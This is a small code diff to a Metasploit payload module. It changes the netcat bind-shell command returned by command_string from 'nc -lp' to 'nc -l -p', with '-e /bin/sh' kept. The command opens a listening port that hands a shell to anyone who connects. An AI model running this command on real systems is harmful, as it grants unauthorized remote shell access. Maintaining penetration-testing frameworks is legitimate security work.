@@ -46,7 +46,7 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		"nc -lp #{datastore['LPORT']} -e /bin/sh"
+		"nc -l -p #{datastore['LPORT']} -e /bin/sh"
 	end
 
 end
